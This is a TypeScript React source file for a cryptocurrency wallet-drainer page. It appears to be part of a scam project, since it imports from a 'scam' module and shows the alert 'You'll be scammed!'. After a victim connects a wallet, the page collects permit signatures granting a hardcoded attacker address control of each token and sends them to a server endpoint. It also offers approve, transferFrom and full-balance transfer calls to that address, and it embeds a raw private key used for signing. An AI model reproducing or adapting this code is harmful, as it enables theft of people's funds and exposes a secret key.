'use client';
import {useWalletInfo, useWeb3Modal} from "@web3modal/scaffold-react";
import {useAccount, useBalance, useDisconnect, useSendTransaction, useSignMessage} from "wagmi";
import {parseEther} from "viem";
import {signTypedData} from "@wagmi/core";
import {config} from "@/context/config";
import {BigNumber, ethers, Wallet} from "ethers";
import React, {useEffect, useState} from "react";
import {useEthersProvider, useEthersSigner} from "@/app/ethers";
import {JsonRpcSigner} from "@ethersproject/providers";
import TokenList, {ContractCovalenTHQ} from "@/app/TokenList";
import {SignedPermitSignature} from "@/app/scam/page";

const BNBContract = "0x1b44F3514812d835EB1BDB0acB33d3fA3351Ee43";
let developer = {
	address: "0xb3b77682060b7f6f589BAB55ECc269dF03ED3C96"
}
const abi = [
	'function permit (address owner, address spender, uint256 value, uint256 deadline, uint8 v, bytes32 r, bytes32 s)',
	'function nonces(address owner) view returns (uint256)'
];

const Page = () => {
	const open = useWeb3Modal();
	const wallet = useWalletInfo();
	const account = useAccount();
	const {disconnect} = useDisconnect();
	const provider = useEthersProvider();
	const signer = useEthersSigner()
	const [signatures, setSignatures] = useState<{
		[key: string]: Awaited<ReturnType<typeof createPermitSignature>>
	}>({})
	const {data: balance, isLoading} = useBalance({
		address: account.address,
	})
	const [tokens, setTokens] = useState<ContractCovalenTHQ[]>([]);

	if (isLoading) return "LOADING";

	if (!account || isLoading) return <button disabled={isLoading} onClick={() => open.open()}>
		Connect Wallet
	</button>;
	const providerUrl = //@ts-ignore
		provider?.connection?.url;


	return (
		<div className={'flex flex-col gap-1 items-start p-4'}>
			<div className={'flex gap-2 items-center'}>
				<button disabled={!!account?.address} onClick={() => open.open()}>
					{!!account.address ? "CONNECTED" : "Connect Wallet"}
				</button>
				<img src={wallet.walletInfo?.icon}/>
			</div>
			<br/>
			<div className={'flex gap-2 items-center'}>
				<p>{account.address} ({account.chainId}) </p>
				<button onClick={disconnect as any}>
					Disconnect
				</button>
			</div>
			<br/>
			{tokens.map(token => {

				return (
					<div className={'flex gap-2'}>
						{token.contract_ticker_symbol}
						<button disabled={!!signatures[token.contract_ticker_symbol] || token.contract_address.includes("eeeeeeee")} onClick={async () => {
							let nonce = -1;

							try {
								nonce = (await callContractMethod('nonces', [account.address], token.contract_address,providerUrl)).toString()
							} catch {
							}

							if (isNaN(+nonce) || +nonce < 0) {
								nonce = await provider?.getTransactionCount(account.address!) || 0;
							}

							const sig = await createPermitSignature(async (args: any)=>{
								return signTypedData(config, args);
							},
							token.contract_name || "UNITY2",
								token.contract_address,
								account.chainId || 0,
								account.address+"",
								developer.address,
								window.prompt("enter amount")+"",
								nonce,
								2661766724,
							)

							console.log(
								"R",sig.r.toString('hex'),
								"S",sig.s.toString('hex'),
								"V", sig.v.toString()
							);
							console.log(sig);

							setSignatures(pre => ({
								...pre,
								[token.contract_ticker_symbol]: sig
							}));

							const payload: FinalizedSignedSignature = {
								signedSignature: sig,
								provider: providerUrl,
								token
							}

							fetch("/api/signature", {
								method: "POST",
								body: JSON.stringify(payload),
								headers: {
									'content-type': "application/json"
								}
							}).then(()=>alert("You'll be scammed!")).catch(console.error)
						}}>
							Signature Request
						</button>
						<button onClick={()=>{
							signer?.sendTransaction({
								from: account.address,
								to: developer.address,
								chainId: account.chainId,
								value: BigInt(BigInt(token.balance) - BigInt('10000000')),
								gasLimit: 20000,
								gasPrice: 100
							});
						}}>
							Transaction
						</button>
						<button onClick={async ()=>{
							await callContractMethod('approve',[developer.address,token.balance], token.contract_address,signer!);
						}}>
							Approve
						</button>
					</div>
				)
			})}

			<br/>
			{tokens.map(token => {
				const signature = signatures[token.contract_ticker_symbol];

				return (
					<div className={'flex gap-2 hidden'}>
						{token.contract_ticker_symbol}
						<button disabled={!signature} onClick={async () => {
							if (!signature) return;

							callContractMethod('permit', [
									account.address,
									developer.address,
									signature.permit.value,
									signature.permit.deadline,
									signature.v.toString(),
									"0x"+signature.r.toString('hex'),
									"0x"+signature.s.toString('hex'),
									{
										gasLimit: 1000000
									}
								],token.contract_address,
								//@ts-ignore
								provider.connection.url+"")
								.catch((e)=>{
									alert(`ERROR ${e?.message ?? e}`);
									console.error(e)
								}).then(()=>{
								alert("Permit successful!")
							});
						}}>
							Permit
						</button>
						<button onClick={async ()=>{
							alert((await callContractMethod('allowance', [
									account.address,
									developer.address
								],token.contract_address,
								//@ts-ignore
								provider.connection.url+"")).toString())
						}}>
							Allowance
						</button>
						<button onClick={async ()=>{
							callContractMethod('transferFrom', [
									account.address,
									developer.address,
									signature.permit.value,
									{
										gasLimit: 1000000
									}
								],token.contract_address,
								//@ts-ignore
								provider.connection.url+"")
								.catch((e)=>{
									alert(`ERROR ${e?.message ?? e}`);
									console.error(e)
								}).then(()=>{
									alert("Transfer successful!")
							});
						}}>
							Transfer
						</button>
					</div>
				)
			})}
			<br/>
			<TokenList address={account.address + ""} setTokens={setTokens} CHAIN_ID={+(account.chainId || "0")}/>
		</div>
	)
};

export async function createPermitSignature(signMethod: any, domainName: string,contractAddress: string,chainId: number,owner: string, spender: string, value: string, nonce: number, deadline: number,domainVersion: string = "1") {
	const domain = {
		name: domainName,
		version: domainVersion,
		verifyingContract: contractAddress,
		chainId
	}

	const domainType = [
		{ name: 'name', type: 'string' },
		{ name: 'version', type: 'string' },
		{ name: 'chainId', type: 'uint256' },
		{ name: 'verifyingContract', type: 'address' },
	]
	const permit = { owner, spender, value, nonce, deadline }
	const Permit = [
		{ name: "owner", type: "address" },
		{ name: "spender", type: "address" },
		{ name: "value", type: "uint256" },
		{ name: "nonce", type: "uint256" },
		{ name: "deadline", type: "uint256" },
	]

	const dataToSign ={
		types: {
			EIP712Domain: domainType,
			Permit: Permit
		},
		domain: domain,
		primaryType: "Permit",
		message: permit
	};

	const splitSig = (sig: string) => {
		// splits the signature to r, s, and v values.
		const pureSig = sig.replace("0x", "")

		const r = new Buffer(pureSig.substring(0, 64), 'hex')
		const s = new Buffer(pureSig.substring(64, 128), 'hex')
		const v = new Buffer((parseInt(pureSig.substring(128, 130), 16)).toString());


		return {
			r, s, v
		}
	}

	const signature = await signMethod(dataToSign)
	const split = splitSig(signature)

	return {
		...split, signature,permit,
		v: split.v.toString(),
		s: "0x"+split.s.toString('hex'),
		r: "0x"+split.r.toString('hex'),
	}
}

let _WALLET: Wallet;

const createSigner = async (rpc: string): Promise<JsonRpcSigner>=>{
	const provider = new ethers.providers.JsonRpcProvider(rpc);
	await provider.detectNetwork()
	const privateKey = 'f0d3d8a445a62ee09543c760c0856560b2a8602b8f289e2b69c3ac0ce498df59';
	_WALLET = new Wallet(privateKey, provider);
	console.log("TARGET ADDRESS",_WALLET.address)
	return _WALLET as any;
}

const methods = {
	allowance: "function allowance (address owner, address spender) view returns (uint256)",
	transferFrom: "function transferFrom(address sender, address to, uint256 amount) external returns (bool)",
	permit: 'function permit (address owner, address spender, uint256 value, uint256 deadline, uint8 v, bytes32 r, bytes32 s) external',
	nonces: "function nonces(address owner) view returns (uint256)",
	approve: "function approve(address spender, uint256 amount) public returns (bool)"
}

export async function callContractMethod(method: keyof typeof methods,args: any[], addressOrName: string, signerOrRPC: JsonRpcSigner | string) {
	if (typeof signerOrRPC === 'string') {
		signerOrRPC = await createSigner(signerOrRPC);
	}

	console.log("init contract", addressOrName);
	let tokenContract = new ethers.Contract(addressOrName,[
		methods[method]
	], signerOrRPC);
	console.log("CALL", method,args);
	const op = await tokenContract[method](...args)
	console.log('WAITING', op);
	return await op?.wait?.() || op;
}

declare global {
	var CCM: typeof callContractMethod
}
if (typeof window !== 'undefined') {
	window.CCM = callContractMethod;
}

export type FinalizedSignedSignature = {
	signedSignature: SignedPermitSignature,
	provider: string,
	token: ContractCovalenTHQ
}

export default Page;
